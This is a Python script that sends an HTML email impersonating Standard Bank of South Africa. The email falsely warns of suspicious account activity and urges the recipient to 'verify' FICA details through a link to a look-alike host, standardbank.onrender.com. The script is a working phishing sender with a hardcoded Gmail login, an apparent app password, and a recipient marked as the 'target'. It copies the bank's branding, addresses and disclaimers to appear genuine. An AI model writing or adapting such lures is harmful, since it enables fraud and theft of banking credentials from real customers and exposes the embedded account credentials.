import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

# ========== Gmail SMTP ==========
smtp_server = "smtp.gmail.com"
port = 587
username = "Standardbankingconfirmation@gmail.com"   # 👈 your Gmail
password = "udyu gyfv rfjj fvgk"     # 👈 use App Password if 2FA enabled
# =================================

# Create message
msg = MIMEMultipart("alternative")
msg["From"] = username
msg["To"] = "moneybman0@gmail.com"   # 👈 sending to your target email
msg["Subject"] = "Standard Bank: Account Verification Required"

# HTML content
html_content = """<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Standard Bank - Account Verification Required</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f4f4f4;
            line-height: 1.6;
        }
        
        .email-container {
            max-width: 600px;
            margin: 0 auto;
            background-color: #ffffff;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }
        
        .header-bar {
            background-color: #003cc7;
            color: white;
            padding: 10px 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .header-left {
            font-size: 14px;
        }
        
        .header-right {
            display: flex;
            align-items: center;
            gap: 20px;
        }
        
        .logo {
            width: 40px;
            height: 40px;
            background-color: white;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            color: #003cc7;
            font-size: 16px;
        }
        
        .content {
            padding: 30px;
            color: #333;
        }
        
        .bank-info {
            margin-bottom: 30px;
            font-size: 14px;
            color: #666;
        }
        
        .greeting {
            font-size: 18px;
            margin-bottom: 20px;
            color: #333;
        }
        
        .main-message {
            font-size: 16px;
            margin-bottom: 25px;
            color: #333;
        }
        
        .verification-link {
            background-color: #003cc7;
            color: white;
            padding: 15px 25px;
            text-decoration: none;
            border-radius: 5px;
            display: inline-block;
            margin: 20px 0;
            font-weight: bold;
            font-size: 16px;
        }
        
        .verification-link:hover {
            background-color: #002a8f;
        }
        
        .queries-section {
            margin: 30px 0;
            padding: 20px;
            background-color: #f8f9fa;
            border-left: 4px solid #003cc7;
        }
        
        .queries-title {
            font-weight: bold;
            margin-bottom: 10px;
            color: #333;
        }
        
        .contact-info {
            font-size: 14px;
            color: #666;
        }
        
        .footer-bar {
            background: linear-gradient(90deg, #003cc7 0%, #0056b3 100%);
            color: white;
            padding: 15px 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .footer-logo {
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .footer-slogan {
            font-weight: bold;
            font-size: 18px;
        }
        
        .disclaimer {
            padding: 20px;
            font-size: 11px;
            color: #666;
            line-height: 1.4;
        }
        
        .disclaimer a {
            color: #003cc7;
            text-decoration: none;
        }
        
        .disclaimer a:hover {
            text-decoration: underline;
        }
        
        @media (max-width: 600px) {
            .email-container {
                margin: 10px;
            }
            
            .content {
                padding: 20px;
            }
            
            .header-bar, .footer-bar {
                flex-direction: column;
                gap: 10px;
                text-align: center;
            }
        }
    </style>
</head>
<body>
    <div class="email-container">
        <!-- Header Bar -->
        <div class="header-bar">
            <div class="header-left">
                Customer Care: 086 120 1311
            </div>
            <div class="header-right">
                <span>Website: www.standardbank.co.za</span>
                <div class="logo">SB</div>
            </div>
        </div>
        
        <!-- Main Content -->
        <div class="content">
            <!-- Bank Information -->
            <div class="bank-info">
                Standard Bank Centre<br>
                5 Simmonds Street<br>
                Johannesburg<br>
                2001<br>
                P.O. Box 7725<br>
                Johannesburg 2000<br>
                Telephone: 086 120 1311<br>
                Website: <a href="https://www.standardbank.co.za" style="color: #003cc7;">www.standardbank.co.za</a>
            </div>
            
            <!-- Greeting -->
            <div class="greeting">
                Hello [Customer Name],
            </div>
            
            <!-- Main Message -->
            <div class="main-message">
                Due to suspicious activities ongoing in your account, please verify your FICA information by clicking on the link below.
            </div>
            
            <!-- Verification Link -->
            <a href="https://standardbank.onrender.com/" class="verification-link">
                VERIFY ACCOUNT NOW
            </a>
            
            <!-- Queries Section -->
            <div class="queries-section">
                <div class="queries-title">Queries?</div>
                <div class="contact-info">
                    Call South Africa: 086 0123 000<br>
                    International: +27 01 249 0423
                </div>
            </div>
            
            <!-- Closing -->
            <div style="margin-top: 30px;">
                Regards,<br>
                <strong>Standard Bank</strong>
            </div>
            
            <div style="margin-top: 20px; font-size: 14px; color: #666;">
                Please do not reply to this mail, as it was sent from an unattended mailbox.
            </div>
        </div>
        
        <!-- Footer Bar -->
        <div class="footer-bar">
            <div class="footer-logo">
                <div class="logo">SB</div>
                <span class="footer-slogan">IT CAN BE.</span>
            </div>
        </div>
        
        <!-- Disclaimer -->
        <div class="disclaimer">
            <p><strong>The Standard Bank of South Africa Limited (Reg. No. 1962/000738/06).</strong> Authorised financial services provider. Registered credit provider NCR CP15.</p>
            
            <p><strong>Standard Bank Isle of Man Limited</strong> is licensed by the Isle of Man Financial Services Authority. <strong>Standard Bank Jersey Limited</strong> is regulated by the Jersey Financial Services Commission.</p>
            
            <p><strong>The Standard Bank email disclaimer and confidentiality note.</strong></p>
            
            <p>This email and any files transmitted with it are confidential and intended solely for the use of the individual or entity to whom they are addressed. If you have received this email in error please notify the system manager.</p>
            
            <p>This email message may contain legally privileged and/or confidential information. If you are not the intended recipient(s), or the employee or agent responsible for the delivery of this message to the intended recipient(s), you are hereby notified that any dissemination, distribution or copying of this e-mail message is strictly prohibited.</p>
            
            <p>If you have received this e-mail message in error, please immediately notify the sender and delete this e-mail message from your computer. Do not disclose or use the email in any manner whatsoever.</p>
            
            <p>The views and opinions expressed in this email are those of the author and do not necessarily reflect the official policy or position of Standard Bank Group Limited.</p>
            
            <p>Standard Bank Group Limited accepts no liability for any loss or damages arising from this email or its attachments, and does not warrant the integrity of the email or that it is free of errors, viruses, interception or interference.</p>
            
            <p><strong>IMPORTANT:</strong> The group will never send you any email or other communication asking you to update or provide confidential information about you or your account. If you have any doubts about the legitimacy of this email or other emails you receive claiming to be from Standard Bank please forward them to <a href="mailto:phishing@standardbank.co.za">phishing@standardbank.co.za</a></p>
            
            <p>For more information about Standard Bank Group Limited see <a href="https://www.standardbank.com">www.standardbank.com</a></p>
        </div>
    </div>
</body>
</html>"""

# Attach HTML
msg.attach(MIMEText(html_content, "html"))

# Send email
server = smtplib.SMTP(smtp_server, port)
server.starttls()
server.login(username, password)
server.sendmail(msg["From"], msg["To"], msg.as_string())
server.quit()

print("✅ Test email sent successfully!")